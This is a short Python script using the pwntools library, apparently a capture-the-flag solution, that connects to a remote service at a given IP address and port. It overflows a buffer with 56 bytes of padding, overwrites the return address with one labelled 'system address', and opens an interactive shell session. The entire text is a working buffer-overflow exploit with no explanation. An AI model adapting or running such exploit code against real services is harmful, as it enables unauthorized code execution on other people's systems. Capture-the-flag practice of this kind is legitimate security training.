from pwn import *
import os

os.system('clear')
context.log_level = 'debug'
sh = remote('144.126.232.222',30851)
p = b'A' * 56
p += p64(4197138) #0x400b12 # system address
sh.sendlineafter(b'>>', b'1')
sh.sendlineafter(b':', p)

sh.interactive()
